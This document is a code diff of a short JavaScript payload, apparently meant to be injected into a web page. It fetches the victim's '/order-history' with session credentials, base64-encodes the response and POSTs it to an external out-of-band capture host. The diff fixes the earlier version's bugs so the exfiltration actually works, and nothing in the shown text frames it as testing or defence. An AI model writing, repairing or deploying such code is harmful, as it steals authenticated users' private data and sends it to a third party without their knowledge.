@@ -1,26 +1,42 @@
-
 const url = "https://d14tov0gn2sl5jg9g1sgudzxavijmmgex.oast.pro";
 
 async function fetchData() {
     try {
+        // Fetch order history
         const response = await fetch('/order-history', {
-            method: 'GET'
+            method: 'GET',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            credentials: 'include' // If authentication is needed
         });
-        data = btoa(response.body);
+
+        if (!response.ok) {
+            throw new Error(`HTTP error! Status: ${response.status}`);
+        }
+
+        // Read response as text (or .json() if JSON data)
+        const textData = await response.text();
+
+        // Convert to Base64
+        const base64Data = btoa(unescape(encodeURIComponent(textData)));
+
+        // Send data to external URL
         await fetch(url, {
             method: 'POST',
-            body: data,
+            headers: {
+                'Content-Type': 'text/plain',
+            },
+            body: base64Data,
         });
+
+        console.log('Data sent successfully');
     } catch (error) {
-        console.error('Error fetching data:', error);
-        throw error; // Re-throw the error for further handling
+        console.error('Error in fetchData:', error);
+        throw error; // Re-throw if needed
     }
 }
 
+// Execute
 fetchData()
-    .then(() => {
-        console.log('Data fetched successfully');
-    })
-    .catch(error => {
-        console.error('Error in fetchData:', error);
-    });
+    .catch(error => console.error('Final error:', error));
